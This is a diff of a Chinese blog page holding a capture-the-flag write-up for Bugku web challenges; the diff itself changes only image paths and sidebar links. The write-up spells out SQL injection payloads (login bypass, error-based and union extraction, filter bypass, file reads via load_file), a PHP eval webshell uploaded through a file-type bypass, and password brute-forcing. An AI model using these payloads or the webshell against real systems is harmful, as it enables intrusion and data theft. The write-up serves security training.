@@ -7,111 +7,111 @@
     error: '复制错误',
     noSupport: '浏览器不支持'
   }
-} </script></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#这是一个神奇的登录框"><span class="toc-number">1.</span> <span class="toc-text">这是一个神奇的登录框</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#多次"><span class="toc-number">2.</span> <span class="toc-text">多次</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP-encrypt-1-ISCCCTF"><span class="toc-number">3.</span> <span class="toc-text">PHP_encrypt_1(ISCCCTF)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#文件包含2"><span class="toc-number">4.</span> <span class="toc-text">文件包含2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag-php"><span class="toc-number">5.</span> <span class="toc-text">flag.php</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#报错注入"><span class="toc-number">6.</span> <span class="toc-text">报错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#login3-SKCTF"><span class="toc-number">7.</span> <span class="toc-text">login3(SKCTF)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#网站被黑"><span class="toc-number">8.</span> <span class="toc-text">网站被黑</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Trim的日记本"><span class="toc-number">9.</span> <span class="toc-text">Trim的日记本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#文件上传2"><span class="toc-number">10.</span> <span class="toc-text">文件上传2</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">Somnus</div><div class="author-info__description text-center">与其哀叹，不如埋头苦干</div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">69</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">14</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">分类</span><span class="pull-right">24</span></a></div></div></div><div id="content-outer"><div class="no-bg" id="top-container"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Somnus's blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">Bugkuctf-Web(3)</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2018-08-06</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/Bugkuctf-Web/">Bugkuctf-Web</a></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><p>Bugkuctf中的Web题解(三)<a id="more"></a></p>
+} </script></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#这是一个神奇的登录框"><span class="toc-number">1.</span> <span class="toc-text">这是一个神奇的登录框</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#多次"><span class="toc-number">2.</span> <span class="toc-text">多次</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP-encrypt-1-ISCCCTF"><span class="toc-number">3.</span> <span class="toc-text">PHP_encrypt_1(ISCCCTF)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#文件包含2"><span class="toc-number">4.</span> <span class="toc-text">文件包含2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag-php"><span class="toc-number">5.</span> <span class="toc-text">flag.php</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#报错注入"><span class="toc-number">6.</span> <span class="toc-text">报错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#login3-SKCTF"><span class="toc-number">7.</span> <span class="toc-text">login3(SKCTF)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#网站被黑"><span class="toc-number">8.</span> <span class="toc-text">网站被黑</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Trim的日记本"><span class="toc-number">9.</span> <span class="toc-text">Trim的日记本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#文件上传2"><span class="toc-number">10.</span> <span class="toc-text">文件上传2</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">Somnus</div><div class="author-info__description text-center">与其哀叹，不如埋头苦干</div><div class="follow-button"><a href="https://Nikoeurus.github.io">Follow Me</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">69</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">14</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">分类</span><span class="pull-right">24</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">Links</div><a class="author-info-links__name text-center" href="https://mochazz.github.io" target="_blank" rel="noopener">七月火</a></div></div></div><div id="content-outer"><div class="no-bg" id="top-container"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Somnus's blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">Bugkuctf-Web(3)</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2018-08-06</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/Bugkuctf-Web/">Bugkuctf-Web</a></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><p>Bugkuctf中的Web题解(三)<a id="more"></a></p>
 <h3 id="这是一个神奇的登录框"><a href="#这是一个神奇的登录框" class="headerlink" title="这是一个神奇的登录框"></a>这是一个神奇的登录框</h3><p>网址：<a href="http://120.24.86.145:9001/sql/" target="_blank" rel="noopener">http://120.24.86.145:9001/sql/</a></p>
 <p>看到登录框，网址又有sql，八成就是sql注入</p>
 <p>试一下用户名输入admin’，没有报错，再试试admin”</p>
-<p><img src="/img/Bugkuctf-Web/90.png" alt=""></p>
-<p><img src="/img/Bugkuctf-Web/92.png" alt=""></p>
+<p><img src="../../../../img/Bugkuctf-Web/90.png" alt=""></p>
+<p><img src="../../../../img/Bugkuctf-Web/92.png" alt=""></p>
 <p>发现报错了，果然存在sql注入，从报错信息就看出来用户名和密码都被双引号包裹</p>
 <p>那么我们就可以用万能密码登录了</p>
 <p>payloads:admin_name=admin&amp;admin_passwd=1” or “1”=”1&amp;submit=GO+GO+GO</p>
-<p><img src="/img/Bugkuctf-Web/93.png" alt=""></p>
+<p><img src="../../../../img/Bugkuctf-Web/93.png" alt=""></p>
 <p>应该是登录成功了，但是要我们换一个身份登录才能拿到flag</p>
 <p>换个payloads:admin_name=AdMiNhEhE&amp;admin_passwd=1” or “1”=”1&amp;submit=GO+GO+GO</p>
-<p><img src="/img/Bugkuctf-Web/93.png" alt=""></p>
+<p><img src="../../../../img/Bugkuctf-Web/93.png" alt=""></p>
 <p>结果还是一样的，看来是只返回了用户名的信息，那干脆就直接利用报错注入注出信息试试</p>
 <p>先爆库</p>
 <p>payloads:admin_name=admin” and extractvalue(1,concat(0x3a,database(),0x3a))#&amp;admin_passwd=&amp;submit=GO+GO+GO</p>
-<p><img src="/img/Bugkuctf-Web/94.png" alt=""></p>
+<p><img src="../../../../img/Bugkuctf-Web/94.png" alt=""></p>
 <p>库名bugkusql1</p>
 <p>爆表</p>
 <p>payloads:admin_name=admin” and extractvalue(1,concat(0x3a,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x3a))#&amp;admin_passwd=&amp;submit=GO+GO+GO</p>
-<p><img src="/img/Bugkuctf-Web/95.png" alt=""></p>
+<p><img src="../../../../img/Bugkuctf-Web/95.png" alt=""></p>
 <p>表名为flag1,whoami</p>
 <p>爆flag1表下的列名</p>
 <p>payloads:admin_name=admin” and extractvalue(1,concat(0x3a,(select group_concat(column_name) from information_schema.columns where table_name=’flag1’),0x3a))#&amp;admin_passwd=&amp;submit=GO+GO+GO</p>
-<p><img src="/img/Bugkuctf-Web/96.png" alt=""></p>
+<p><img src="../../../../img/Bugkuctf-Web/96.png" alt=""></p>
 <p>列名为flag1</p>
 <p>最后爆flag1列下的数据</p>
 <p>payloads:admin_name=admin” and extractvalue(1,concat(0x3a,(select group_concat(flag1) from flag1),0x3a))#&amp;admin_passwd=&amp;submit=GO+GO+GO</p>
-<p><img src="/img/Bugkuctf-Web/97.png" alt=""></p>
+<p><img src="../../../../img/Bugkuctf-Web/97.png" alt=""></p>
 <p>试一下这个是不是flag，发现错误，仔细看才发现flag太长了报错信息没显示全…</p>
 <p>那再试试爆whoami表吧，看看能不能爆出密码</p>
 <p>先爆whoami表下的列名：</p>
 <p>payloads:admin_name=admin” and extractvalue(1,concat(0x3a,(select group_concat(column_name) from information_schema.columns where table_name=’whoami’),0x3a))#&amp;admin_passwd=&amp;submit=GO+GO+GO</p>
-<p><img src="/img/Bugkuctf-Web/98.png" alt=""></p>
+<p><img src="../../../../img/Bugkuctf-Web/98.png" alt=""></p>
 <p>列名为w_id,w_name,w_passwd</p>
 <p>爆passwd</p>
 <p>payloads:admin_name=admin” and extractvalue(1,concat(0x3a,(select w_passwd from whoami where w_name=’AdMiNhEhE’),0x3a))#&amp;admin_passwd=&amp;submit=GO+GO+GO</p>
-<p><img src="/img/Bugkuctf-Web/99.png" alt=""></p>
+<p><img src="../../../../img/Bugkuctf-Web/99.png" alt=""></p>
 <p>发现又太长了…</p>
 <p>仔细一想，用万能密码登录时也是有返回信息的，为什么不用联合注入呢…</p>
 <p>查询列数为2</p>
 <p>payloads:admin_name=0” union select flag1,2 from flag1 #&amp;admin_passwd=&amp;submit=GO+GO+GO</p>
-<p><img src="/img/Bugkuctf-Web/100.png" alt=""></p>
+<p><img src="../../../../img/Bugkuctf-Web/100.png" alt=""></p>
 <p>输入flag{ed6b28e684817d9efcaf802979e57aea}，成功</p>
 <h3 id="多次"><a href="#多次" class="headerlink" title="多次"></a>多次</h3><p>网址：<a href="http://120.24.86.145:9004/" target="_blank" rel="noopener">http://120.24.86.145:9004/</a></p>
 <p>一进去页面发现url：<a href="http://120.24.86.145:9004/1ndex.php?id=1" target="_blank" rel="noopener">http://120.24.86.145:9004/1ndex.php?id=1</a></p>
 <p>就尝试修改id值，id=1,2,3,4,5到5的时候提示</p>
-<p><img src="/img/Bugkuctf-Web/101.png" alt=""></p>
+<p><img src="../../../../img/Bugkuctf-Web/101.png" alt=""></p>
 <p>存在sql注入漏洞，猜测是数字型注入，注入点是id</p>
 <p>那试一下id=1’，显示error</p>
 <p>猜测可能id被单引号包裹，输入id=1’%23，正确显示信息，那么接下来注出查询列数</p>
 <p>输入id=1’ order by 3%23，显示error，将3改为2，又eroor，改为1，还是error，慌了…估计是把order 或者by给过滤了</p>
 <p>试一下输入id=1’ ^ (length(‘order’)!=0)%23，显示error，说明不是order被过滤</p>
 <p>再试一下输入id=1’ ^ (length(‘or’)!=0)%23</p>
-<p><img src="/img/Bugkuctf-Web/102.png" alt=""></p>
+<p><img src="../../../../img/Bugkuctf-Web/102.png" alt=""></p>
 <p>发现正确显示信息，说明or被过滤掉了，类似再尝试一下关键词and,select,union，发现都被过滤了</p>
 <p>尝试一下双写可不可以绕过，输入id=1’ oorrder by 2%23</p>
-<p><img src="/img/Bugkuctf-Web/103.png" alt=""></p>
+<p><img src="../../../../img/Bugkuctf-Web/103.png" alt=""></p>
 <p>正确显示信息，说明可能是用函数str_replace进行过滤，那么双写即可绕过</p>
 <p>输入id=1’ oorrder by 3%23，显示error，说明查询列数为2</p>
 <p>接下来就是熟悉爆库</p>
 <p>输入id=0’ uunionnion sselectelect 1,database()%23</p>
-<p><img src="/img/Bugkuctf-Web/104.png" alt=""></p>
+<p><img src="../../../../img/Bugkuctf-Web/104.png" alt=""></p>
 <p>数据库名：web1002-1</p>
 <p>爆表名</p>
 <p>输入id=0’ uunionnion sselectelect 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema=database()%23 </p>
-<p><img src="/img/Bugkuctf-Web/105.png" alt=""></p>
+<p><img src="../../../../img/Bugkuctf-Web/105.png" alt=""></p>
 <p>表名：flag1,hint </p>
 <p>爆列名</p>
 <p>输入id=0’ uunionnion sselectelect 1,group_concat(column_name) from infoorrmation_schema.columns where table_name=’flag1’%23 </p>
-<p><img src="/img/Bugkuctf-Web/106.png" alt=""></p>
+<p><img src="../../../../img/Bugkuctf-Web/106.png" alt=""></p>
 <p>列名：flag1,address </p>
 <p>爆flag列下的数据</p>
 <p>输入id=0’ uunionnion sselectelect 1,flag1 from flag1%23</p>
-<p><img src="/img/Bugkuctf-Web/107.png" alt=""></p>
+<p><img src="../../../../img/Bugkuctf-Web/107.png" alt=""></p>
 <p>提交flag{usOwycTju+FTUUzXosjr}发现错误，突然发现提交的地方提示我们flag有两个</p>
 <p>就试着注出address列下的数据</p>
 <p>输入id=0’ uunionnion sselectelect 1,address from flag1%23</p>
-<p><img src="/img/Bugkuctf-Web/108.png" alt=""></p>
+<p><img src="../../../../img/Bugkuctf-Web/108.png" alt=""></p>
 <p>好像发现了新大陆</p>
 <p>点击访问下一关</p>
-<p><img src="/img/Bugkuctf-Web/109.png" alt=""></p>
+<p><img src="../../../../img/Bugkuctf-Web/109.png" alt=""></p>
 <p>页面的url提示oncemore，并且get参数又是id，猜测还是sql注入</p>
 <p>输入id=1’</p>
-<p><img src="/img/Bugkuctf-Web/110.png" alt=""></p>
+<p><img src="../../../../img/Bugkuctf-Web/110.png" alt=""></p>
 <p>恩？好像隐约看到了报错信息，不过被背景挡住了，没事，看一下源代码</p>
-<p><img src="/img/Bugkuctf-Web/111.png" alt=""></p>
+<p><img src="../../../../img/Bugkuctf-Web/111.png" alt=""></p>
 <p>惊喜发现有报错信息，同时也看出来id被单引号包裹，接着试着注出查询列数</p>
 <p>输入id=1’ order by 2%23，正常显示信息，输入id=1’ order by 3%23，报错。所以查询列数为2</p>
 <p>接下来注库名</p>
 <p>输入id=0’ union select 1,database()%23</p>
-<p><img src="/img/Bugkuctf-Web/112.png" alt=""></p>
+<p><img src="../../../../img/Bugkuctf-Web/112.png" alt=""></p>
 <p>发现union被过滤了，试着双写，没办法绕过</p>
 <p>于是尝试extractvalue报错注入</p>
 <p>输入id=1’ and extractvalue(1,concat(0x3a,database(),0x3a))%23</p>
-<p><img src="/img/Bugkuctf-Web/113.png" alt=""></p>
+<p><img src="../../../../img/Bugkuctf-Web/113.png" alt=""></p>
 <p>成功注入库名：web1002-2 </p>
 <p>输入id=1’ and extractvalue(1,concat(0x3a,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x3a))%23</p>
-<p><img src="/img/Bugkuctf-Web/114.png" alt=""></p>
+<p><img src="../../../../img/Bugkuctf-Web/114.png" alt=""></p>
 <p>表名：class,flag2 </p>
 <p>输入id=1’ and extractvalue(1,concat(0x3a,(select group_concat(column_name) from information_schema.columns where table_name=’flag2’),0x3a))%23</p>
-<p><img src="/img/Bugkuctf-Web/115.png" alt=""></p>
+<p><img src="../../../../img/Bugkuctf-Web/115.png" alt=""></p>
 <p>flag2表下列名：flag2,address </p>
 <p>输入id=1’ and extractvalue(1,concat(0x3a,(select flag2 from flag2),0x3a))%23</p>
-<p><img src="/img/Bugkuctf-Web/116.png" alt=""></p>
+<p><img src="../../../../img/Bugkuctf-Web/116.png" alt=""></p>
 <p>注出flag：flag{Bugku-sql_6s-2i-4t-bug} </p>
 <p>将B改成小写b，提交成功</p>
 <h3 id="PHP-encrypt-1-ISCCCTF"><a href="#PHP-encrypt-1-ISCCCTF" class="headerlink" title="PHP_encrypt_1(ISCCCTF)"></a>PHP_encrypt_1(ISCCCTF)</h3><p>这题直接给了一个php源文件</p>
@@ -122,27 +122,27 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decrypt</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">	$str = base64_decode($str); <span class="comment">// 将encrypt最后的base64加密后的结果进行base64解密</span></span><br><span class="line">	$key = md5(<span class="string">'ISCC'</span>); <span class="comment">// 对应encrypt的$key</span></span><br><span class="line">	$x = <span class="number">0</span>; <span class="comment">// 对应encrypt的$x</span></span><br><span class="line">	$len = strlen($str); <span class="comment">// $最后encrypt得到的$str长度跟原本encrypt传入的$data长度是一致的</span></span><br><span class="line">	$klen = strlen($key); <span class="comment">// 对应encrypt的$klen</span></span><br><span class="line">	$char = <span class="string">''</span>; <span class="comment">// 对应encrypt的$char</span></span><br><span class="line">	$data = <span class="string">''</span>; <span class="comment">// 对应encrypt的$data</span></span><br><span class="line">	<span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $len; $i++)&#123; <span class="comment">//对应encrypt的$char赋值过程</span></span><br><span class="line">		<span class="keyword">if</span>($x == $klen)&#123;</span><br><span class="line">			$x = <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		$char .= $key[$x];</span><br><span class="line">		$x += <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $len; $i++)&#123; <span class="comment">// 获得$data</span></span><br><span class="line">		<span class="keyword">if</span>(ord($str[$i]) &lt; ord($char[$i]))&#123; <span class="comment">// 如果$str的某位的ascii值小于$char的某位的ascii值 </span></span><br><span class="line">			$data .= chr((ord($str[$i]) + <span class="number">128</span>) - ord($char[$i])); <span class="comment">// 说明encrypt有求余128</span></span><br><span class="line">		&#125; </span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			$data .= chr(ord($str[$i]) - ord($char[$i]));</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$str = <span class="string">"fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA="</span>;</span><br><span class="line">$data = decrypt($str);</span><br><span class="line"><span class="keyword">echo</span> $data;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>最后获得flag</p>
-<p><img src="/img/Bugkuctf-Web/117.png" alt=""></p>
+<p><img src="../../../../img/Bugkuctf-Web/117.png" alt=""></p>
 <h3 id="文件包含2"><a href="#文件包含2" class="headerlink" title="文件包含2"></a>文件包含2</h3><p>网址：<a href="http://118.89.219.210:49166/" target="_blank" rel="noopener">http://118.89.219.210:49166/</a></p>
 <p>页面url：<a href="http://118.89.219.210:49166/index.php?file=hello.php" target="_blank" rel="noopener">http://118.89.219.210:49166/index.php?file=hello.php</a></p>
 <p>熟悉的文件包含，试一下利用php://filter读取index.php源码</p>
-<p><img src="/img/Bugkuctf-Web/118.png" alt=""></p>
+<p><img src="../../../../img/Bugkuctf-Web/118.png" alt=""></p>
 <p>天真！！！看来貌似过滤了什么，试一下读取hellp.php，还是一样的结果，看来这个方法行不通，怎么办呢，这时候看一下失败页面的源码</p>
-<p><img src="/img/Bugkuctf-Web/119.png" alt=""></p>
+<p><img src="../../../../img/Bugkuctf-Web/119.png" alt=""></p>
 <p>发现提示了文件upload.php</p>
 <p>访问<a href="http://118.89.219.210:49166/upload.php" target="_blank" rel="noopener">http://118.89.219.210:49166/upload.php</a></p>
 <p>发现是文件上传，要求只能上传图片文件，burp抓包上传一句话试试</p>
-<p><img src="/img/Bugkuctf-Web/120.png" alt=""></p>
+<p><img src="../../../../img/Bugkuctf-Web/120.png" alt=""></p>
 <p>发现过滤了文件名和类型，但是因为有文件包含，我们只要能将一句话包含在文件上传上去就行，将php文件后缀修改为png，文件类型修改为image/png，上传成功后访问图片所在地址</p>
-<p><img src="/img/Bugkuctf-Web/121.png" alt=""></p>
+<p><img src="../../../../img/Bugkuctf-Web/121.png" alt=""></p>
 <p>可以看到代码显示了出来，说明是不符合php语法的代码，仔细看发现php代码开头的<?php ?>被过滤了</p>
 <p>那么换一种方法，上传代码为&lt;?=@eval($_POST[‘cmd’]);</p>
-<p><img src="/img/Bugkuctf-Web/122.png" alt=""></p>
+<p><img src="../../../../img/Bugkuctf-Web/122.png" alt=""></p>
 <p>上传成功，访问页面为空，说明代码成功执行</p>
 <p>然后再用burp POST参数cmd执行命令</p>
-<p><img src="/img/Bugkuctf-Web/123.png" alt=""></p>
+<p><img src="../../../../img/Bugkuctf-Web/123.png" alt=""></p>
 <p>访问this_is_th3_F14g_154f65sd4g35f4d6f43.txt</p>
-<p><img src="/img/Bugkuctf-Web/124.png" alt=""></p>
+<p><img src="../../../../img/Bugkuctf-Web/124.png" alt=""></p>
 <p>获得flag</p>
 <h3 id="flag-php"><a href="#flag-php" class="headerlink" title="flag.php"></a>flag.php</h3><p>网址：<a href="http://120.24.86.145:8002/flagphp/" target="_blank" rel="noopener">http://120.24.86.145:8002/flagphp/</a></p>
 <p>点击页面Login按钮没反应，看一下源代码只是个按钮，用burp试着POST提交user和password参数也没有显示其他的东西，想到题目给的提示：hint，试着访问hint.php，没有结果，题目是flag.php，访问，也没有提示</p>
@@ -153,37 +153,37 @@
 <p>先写个demo，把$KEY序列化后的值打印出来</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$KEY = <span class="string">'ISecer:www.isecer.com'</span>;</span><br><span class="line">$cookie = serialize($KEY);</span><br><span class="line"><span class="keyword">echo</span> $cookie;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/img/Bugkuctf-Web/125.png" alt=""></p>
+<p><img src="../../../../img/Bugkuctf-Web/125.png" alt=""></p>
 <p>然后用burp提交cookie</p>
-<p><img src="/img/Bugkuctf-Web/126.png" alt=""></p>
+<p><img src="../../../../img/Bugkuctf-Web/126.png" alt=""></p>
 <p>没反应…很奇怪，想了很久，看了好久源代码才发现，$KEY值是定义在最后面的，前面是为空的，所以应该提交空字符串的序列化值…很坑</p>
 <p>空字符串序列化值：s:0:””;</p>
 <p>再次burp提交</p>
-<p><img src="/img/Bugkuctf-Web/127.png" alt=""></p>
+<p><img src="../../../../img/Bugkuctf-Web/127.png" alt=""></p>
 <p>拿到flag</p>
 <h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>网址：<a href="http://103.238.227.13:10088/" target="_blank" rel="noopener">http://103.238.227.13:10088/</a></p>
 <p>根据题目的提示，这是一个数字型注入，注入点为GET的参数id，过滤了关键词：空格，单引号，双引号，union，–</p>
 <p>空格可以用%0a替代，union被过滤了那么就用题目的意思：报错注入，注释可以用%23代替–</p>
 <p>直接输入?id=1%23试试</p>
-<p><img src="/img/Bugkuctf-Web/128.png" alt=""></p>
+<p><img src="../../../../img/Bugkuctf-Web/128.png" alt=""></p>
 <p>发现正常显示，那么id就没有被引号包裹，其实就无所谓单双引号被过滤了</p>
 <p>那么我们就可以开始爆库了，输入：</p>
 <p>?id=1%0aand%0aextractvalue(1,concat(0x3a,database(),0x3a))%23</p>
-<p><img src="/img/Bugkuctf-Web/129.png" alt=""></p>
+<p><img src="../../../../img/Bugkuctf-Web/129.png" alt=""></p>
 <p>数据库名为sql4</p>
 <p>爆表，输入?id=1%0aand%0aextractvalue(1,concat(0x3a,(select%0agroup_concat(table_name)%0afrom%0ainformation_schema.tables%0awhere%0atable_schema=database()),0x3a))%23</p>
-<p><img src="/img/Bugkuctf-Web/130.png" alt=""></p>
+<p><img src="../../../../img/Bugkuctf-Web/130.png" alt=""></p>
 <p>表名为temp</p>
 <p>爆列，输入?id=1%0aand%0aextractvalue(1,concat(0x3a,(select%0agroup_concat(column_name)%0afrom%0ainformation_schema.columns%0awhere%0atable_name=0x74656d70),0x3a))%23</p>
-<p><img src="/img/Bugkuctf-Web/131.png" alt=""></p>
+<p><img src="../../../../img/Bugkuctf-Web/131.png" alt=""></p>
 <p>列名为id,title</p>
 <p>爆数据，输入?id=1%0aand%0aextractvalue(1,concat(0x3a,(select%0agroup_concat(title)%0afrom%0atemp),0x3a))%23</p>
-<p><img src="/img/Bugkuctf-Web/132.png" alt=""></p>
+<p><img src="../../../../img/Bugkuctf-Web/132.png" alt=""></p>
 <p>没发现flag…</p>
 <p>说明flag不在数据库里，回到题目页面，又看到了提示，查询文件在/var/test/key_1.php </p>
 <p>说明可能要用mysql的load_file函数读取文件内容，再通过hex函数转化为十六进制数</p>
 <p>输入?id=1%0aand%0aextractvalue(1,concat(0x3a,hex(load_file(0x2f7661722f746573742f6b65795f312e706870)),0x3a))%23</p>
-<p><img src="/img/Bugkuctf-Web/133.png" alt=""></p>
+<p><img src="../../../../img/Bugkuctf-Web/133.png" alt=""></p>
 <p>可以看到没有全部读取，这就是extractvalue函数的缺点，只能读取32位</p>
 <p>这时候就需要利用substr函数每次截取30位读</p>
 <p>先读取前30位</p>
@@ -204,7 +204,7 @@
 <p>输入admin’^1#，提示用户名不存在，输入admin’^0#，提示密码错误，很好，那么就可以利用这个提示信息进行基于布尔的盲注</p>
 <p>接下来就是搞定逻辑语句了，正常来说我们是用语句ascii(substr(database(),1,1))=数字，但是尝试就发现了，这题还过滤了逗号，等号，等号可以用不等号&lt;&gt;代替，那么用ascii(substr(database() from 1 for 1))=数字，这样可以吗，又发现for和空格被过滤了…</p>
 <p>怎么办，借鉴了别人的思路，才发现mysql用ascii的参数是一个字符串时，会只计算字符串第一位的ascii值</p>
-<p><img src="/img/Bugkuctf-Web/134.png" alt=""></p>
+<p><img src="../../../../img/Bugkuctf-Web/134.png" alt=""></p>
 <p>如图所示，语句ascii(substr(database()from(1)))就可以输出数据库名第一位的ascii值</p>
 <p>那么思路就很清晰了，根据输入admin’^(ascii(substr(database()from(数字1)))&lt;&gt;数字2)#，根据返回的信息，如果返回了”password error!” ，说明数字2就是数据库的第数字1位的ascii值</p>
 <p>直接上脚本，注出数据库名：</p>
@@ -218,18 +218,18 @@
 
 <p>得password：51b7a76d51e70b419f60d3473fb6f900</p>
 <p>还得拿去md5解密，解密得skctf123456</p>
-<p><img src="/img/Bugkuctf-Web/135.png" alt=""></p>
+<p><img src="../../../../img/Bugkuctf-Web/135.png" alt=""></p>
 <p>获得flag</p>
 <h3 id="网站被黑"><a href="#网站被黑" class="headerlink" title="网站被黑"></a>网站被黑</h3><p>网址：<a href="http://120.24.86.145:8002/webshell/" target="_blank" rel="noopener">http://120.24.86.145:8002/webshell/</a></p>
 <p>啥提示都没有，只有url有个提示webshell，试着扫一下后台</p>
-<p><img src="/img/Bugkuctf-Web/136.png" alt=""></p>
+<p><img src="../../../../img/Bugkuctf-Web/136.png" alt=""></p>
 <p>发现shell.php</p>
 <p>进去要输入密码才能看到flag，不是sql，只能burp爆破密码，爆破出来密码是hack</p>
 <h3 id="Trim的日记本"><a href="#Trim的日记本" class="headerlink" title="Trim的日记本"></a>Trim的日记本</h3><p>网址：<a href="http://120.24.86.145:9002/" target="_blank" rel="noopener">http://120.24.86.145:9002/</a></p>
 <p>看着像是sql二次注入，但是死活找不到注入点，id一直不知道处理，试着扫一下后台</p>
-<p><img src="/img/Bugkuctf-Web/137.png" alt=""></p>
+<p><img src="../../../../img/Bugkuctf-Web/137.png" alt=""></p>
 <p>访问一下show.php</p>
-<p><img src="/img/Bugkuctf-Web/138.png" alt=""></p>
+<p><img src="../../../../img/Bugkuctf-Web/138.png" alt=""></p>
 <p>直接给出了flag</p>
